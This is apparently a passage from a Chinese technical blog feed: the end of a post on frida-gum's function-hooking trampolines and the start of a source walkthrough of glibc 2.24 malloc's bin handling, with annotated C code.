<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原函数</span><br><span class="line">----------------------------------------------------</span><br><span class="line">跳板 02C80204</span><br><span class="line">----------------------------------------------------</span><br><span class="line">&#96;enter_chunk&#96;  &#x2F;&#x2F; 首先要保存现场, 构造栈帧，随后进入下一个函数 ⬇️</span><br><span class="line">&#96;__gum_function_context_begin_invocation&#96; &#x2F;&#x2F; 通过设置栈(ret addr)控制执行流程 </span><br><span class="line">----------------------------------------------------</span><br><span class="line">replacement_function</span><br><span class="line">----------------------------------------------------</span><br><span class="line">跳板 02C8020F</span><br><span class="line">----------------------------------------------------</span><br><span class="line">&#96;leave_chunk&#96;</span><br><span class="line">&#96;__gum_function_context_end_invocation&#96; </span><br><span class="line">----------------------------------------------------</span><br><span class="line">继续执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>replace_one 的跳板</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">02C80204  push        dword ptr ds:[2C80200h]  </span><br><span class="line">02C8020A  jmp         02C80000  </span><br><span class="line">02C8020F  push        dword ptr ds:[2C80200h]  </span><br><span class="line">02C80215  jmp         02C80100  </span><br><span class="line">02C8021A  mov         edi,edi  </span><br><span class="line">02C8021C  push        ebp  </span><br><span class="line">02C8021D  mov         ebp,esp  </span><br><span class="line">02C8021F  jmp         malloc+5h (01E5A7B5h)  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04 : 结语"></a>0x04 : 结语</h2><p>这个过程大概花了我一周 5天多的样子，挺难的个人感觉，需要捋清楚的话，配合调试会好很多，最开始我直接看的代码，看+做笔记，脑内debug，最后编译了工程，vs调试，清晰多了，还是建议边调试边看。</p>
<p>如果文中有任何问题，欢迎批评指正  : ) </p>
<p>后面可能会在他基础上做点事情吧…这框架真牛逼 !</p>
<h2 id="0x05-参考与引用"><a href="#0x05-参考与引用" class="headerlink" title="0x05 : 参考与引用"></a>0x05 : 参考与引用</h2><p><a href="https://jmpews.github.io/2017/06/27/pwn/frida-gum%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/"><a href="https://jmpews.github.io/2017/06/27/pwn/frida-gum%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/">rida-gum源码解读</a></a></p>
<p><a href="https://blog.csdn.net/yanbixing123/article/details/52970804">gobject c语言</a></p>
<p><a href="https://bbs.pediy.com/thread-220794.htm">如何构建一款像 frida 一样的框架</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>frida</tag>
      </tags>
  </entry>
  <entry>
    <title>Have fun with glibc内存管理</title>
    <url>/2016/11/21/Have-fun-with-glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<ul>
<li>使用的源码版本 glibc-2.24</li>
<li>持续更新，治疗拖延症。</li>
</ul>
<a id="more"></a>

<h4 id="1-malloc-分析"><a href="#1-malloc-分析" class="headerlink" title="1.malloc 分析"></a>1.malloc 分析</h4><p>​    malloc其实是调用了<code>void *__libc_malloc (size_t bytes)</code>，但是这个函数实质是对<code>static void *_int_malloc (mstate av, size_t bytes) </code>的封装。</p>
<p>​    分析开始，先来看<code>void *__libc_malloc (size_t bytes)</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//首先检查是否存在内存分配的hook函数，如果有，就直接调用；hook函数主要</span></span><br><span class="line">  <span class="comment">//是进程创建新线程的时候内存分配，或者支持用户提供的内存分配函数。</span></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  </span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//若分配成功，释放锁</span></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>  arena_get (ar_ptr, bytes)</code>展开宏就是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line">      ptr = thread_arena;						      \</span><br><span class="line">      arena_lock (ptr, size);						      \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>​    获得分配区并加锁，之后就进入了主要负责内存分配的<code>_int_malloc (ar_ptr, bytes)</code>函数</p>
<p>​    该函数代码特别长，只能一部分一部分看了，首先给出原型，函数有两个参数，即分配区和要分配的内存的大小(用户传进来的，并不是真正的要分配的大小)。</p>
<h6 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes) <span class="comment">//分配区，大小</span></span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个转换是把需要的内存大小bytes，转换成需要分配的chunk的大小nb。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)                             \</span></span><br><span class="line">  <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE (req)) &#123;					      \</span><br><span class="line">      __set_errno (ENOMEM);						      \</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;								      \</span><br><span class="line">    &#125;									      \</span><br><span class="line">  (sz) = request2size (req);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h6 id="2-fastbin"><a href="#2-fastbin" class="headerlink" title="2.fastbin"></a>2.fastbin</h6><p>如果分配大小正好是fastbin，那就直接从fastbin分配。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">	</span><br><span class="line">  <span class="comment">//要分配的值小于等于最大的fastbin大小</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim);</span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一些其他的宏</span></span><br><span class="line"><span class="comment">/* Atomically store NEWVAL in *MEM if *MEM is equal to OLDVAL.</span></span><br><span class="line"><span class="comment">   Return the old *MEM value.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !defined atomic_compare_and_exchange_val_acq \</span></span><br><span class="line">    &amp;&amp; defined __arch_compare_and_exchange_val_32_acq</span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> atomic_compare_and_exchange_val_acq(mem, newval, oldval) \</span></span><br><span class="line">  __atomic_val_bysize (__arch_compare_and_exchange_val,acq,		      \</span><br><span class="line">		       mem, newval, oldval)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> catomic_compare_and_exchange_val_acq</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> __arch_c_compare_and_exchange_val_32_acq</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> catomic_compare_and_exchange_val_acq(mem, newval, oldval) \</span></span><br><span class="line">  __atomic_val_bysize (__arch_c_compare_and_exchange_val,acq,		      \</span><br><span class="line">		       mem, newval, oldval)</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> catomic_compare_and_exchange_val_acq(mem, newval, oldval) \</span></span><br><span class="line">  atomic_compare_and_exchange_val_acq (mem, newval, oldval)</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//展开之后</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __atomic_val_bysize(pre, post, mem, ...)			      \</span></span><br><span class="line">  (&#123;									      \</span><br><span class="line">    __typeof (*mem) __atg1_result;					      \</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">sizeof</span> (*mem) == <span class="number">1</span>)						      \</span><br><span class="line">      __atg1_result = pre##_8_#<span class="meta">#post (mem, __VA_ARGS__);		      \</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">sizeof</span> (*mem) == <span class="number">2</span>)					      \</span><br><span class="line">      __atg1_result = pre##_16_#<span class="meta">#post (mem, __VA_ARGS__);		      \</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">sizeof</span> (*mem) == <span class="number">4</span>)					      \</span><br><span class="line">      __atg1_result = pre##_32_#<span class="meta">#post (mem, __VA_ARGS__);		      \</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">sizeof</span> (*mem) == <span class="number">8</span>)					      \</span><br><span class="line">      __atg1_result = pre##_64_#<span class="meta">#post (mem, __VA_ARGS__);		      \</span></span><br><span class="line">    <span class="keyword">else</span>								      \</span><br><span class="line">      <span class="built_in">abort</span> ();								      \</span><br><span class="line">    __atg1_result;							      \</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>

<p>​    首先根据分配大小，获取该chunk所属的fastbin的index，然后根据index获取所需要的fastbin的空闲链表的头指针；然后将头指针的下一个chunk 作为空闲chunk 链表的头部。后面check之后，直接使用<code>chunk2mem()</code>把用户所需的内存块转换并且返回。</p>
<hr>
<h6 id="3-small-bin"><a href="#3-small-bin" class="headerlink" title="3.small bin"></a>3.small bin</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">    hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">    (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">    processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">    anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">   &#123;</span><br><span class="line">     idx = smallbin_index (nb);</span><br><span class="line">     bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> ((victim = last (bin)) != bin)<span class="comment">//与表头相同，说明链表是空的；不相同的话进入下面的逻辑</span></span><br><span class="line">       &#123;</span><br><span class="line">         <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">           malloc_consolidate (av); <span class="comment">//合并fastbin</span></span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123; </span><br><span class="line">           	<span class="comment">//将victim从双向循环链表中取出来</span></span><br><span class="line">             bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) </span><br><span class="line">               &#123;</span><br><span class="line">                 errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                 <span class="keyword">goto</span> errout;</span><br><span class="line">               &#125;</span><br><span class="line">		<span class="comment">//设置inuse标志。</span></span><br><span class="line">             set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">             bin-&gt;bk = bck;</span><br><span class="line">             bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">               victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>​    首先还是根据分配的大小，找到所对应的small bin的index，然后根据这个index去找到所需的small bin的空闲链表头指针；然后将最后一个chunk赋值给victim，然后做判断，如果和表头相同，那么说明这个链表当前是空的，就不能从这个small bin中分配内存，这就要走后面的流程了；如果不同，这里有两种情况：</p>
<ol>
<li>victim为0，即还没有初始化双向循环链表，这时候就要去合并fast bin；</li>
<li>victim不为0，直接把victim从small bin中取出来，设置标志位，然后判断是否属于主分配区，之后调用<code>chunk2meme()</code>转换成用户所需内存空间并返回。</li>
</ol>
<hr>
<h6 id="4-large-bin"><a href="#4-large-bin" class="headerlink" title="4.large bin"></a>4.large bin</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">   While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">   even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">   fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">   Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">   large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">   invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">   it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line"> 	<span class="comment">//合并fastbin中的chunk，加入unsorted bin</span></span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>​    在分配之前会先合并fast bin中的chunk，加入unsorted bin。</p>
<p>​    下面代码是遍历unsorted bin中的空闲块，加入到相应的small bin 或者large bin之中，代码比较长，所以一部分一部分的看。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">   it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">   the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">   bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">   chunks are placed in bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">   near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">   do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">   otherwise need to expand memory to service a &quot;small&quot; request.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">          malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                           chunk2mem (victim), av);</span><br><span class="line">        size = chunksize (victim);</span><br></pre></td></tr></table></figure>

<p>这里先是反向遍历链表，检查size，要小于等于 <code>2*SIZE_SZ</code>，并且不能大于系统分配的总量。然后获取chunk的size。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">          If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">          only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">          runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">          exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">          no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">           bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">           victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">           (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">           remainder_size = size - nb;</span><br><span class="line">           remainder = chunk_at_offset (victim, nb);</span><br><span class="line">           unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">           av-&gt;last_remainder = remainder;</span><br><span class="line">           remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">  <span class="comment">//large chunk</span></span><br><span class="line">           <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">             &#123;</span><br><span class="line">               remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">               remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">           set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                     (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">           set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">           set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">           check_malloced_chunk (av, victim, nb);</span><br><span class="line">           <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p;</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure>

<p>​    之前的small bin 没有成功分配，并且只有一个chunk的时候，那个chunk就是last remainder chunk，且last remainder chunk 的size大于所需要的<code>大小+MINSIZE</code>，这个时候就可已从这个块中去分配所需要的内存。</p>
<p>​    后面就是从这个chunk 中切分出所需大小的chunk，计算切分后剩下chunk 的大小，将剩下的chunk加入unsorted bin 的链表中，并将剩下的chunk 作为分配区的last remainder chunk，若剩下的chunk 属于large bin chunk，将该chunk 的<code>fd_nextsize</code> 和<code>bk_nextsize </code>设置为NULL。</p>
<p>​    然后设置一些标志位，对于last remainder chunk需要调用<code>set_foot()</code>，因为处于空闲状态的chunk的<code>pre_size</code>才是有效的；之后就是利用<code>chunk2mem()</code>转换，然后返回给用户了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>

<p>​    将双向循环链表中的最后一个chunk 移除</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">  &#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">      victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>​    如果当前遍历的chunk的size正好和需要的分配的大小nb相等，那直接就返回当前块：设置inuse标志位，然后判断是否属于主分配区，并设置相应的标志位，之后调用<code>chunk2mem()</code>转换后就返回给用户了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = smallbin_index (size);</span><br><span class="line">             bck = bin_at (av, victim_index);</span><br><span class="line">             fwd = bck-&gt;fd;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>

<p>判断当前遍历的chunk是否在small bin的范围，在的话插入到small bin的表头，成为第一个块。</p>
<p>不在small bin的范围的话，就是large bin了，就走下面的逻辑：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br></pre></td></tr></table></figure>

<p>类似上面的，把当前遍历的这个chunk插入到large bin的表头成为large bin的第一个块。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">           <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">             &#123;</span><br><span class="line">               <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">               size |= PREV_INUSE;</span><br><span class="line">               <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">               assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">               <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                 &#123;</span><br><span class="line">                   fwd = bck;</span><br><span class="line">                   bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                   victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                   victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                   fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                 &#125;</span><br></pre></td></tr></table></figure>

<p><code>if (fwd != bck)</code>意味着当前链表不为空，需要把当前的块插入large bin的链表中，设置inuse标志，并且插入到适合的位置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>

<p>如果size比最后一个chunk的siz还要小，那就直接插入到最后。</p>
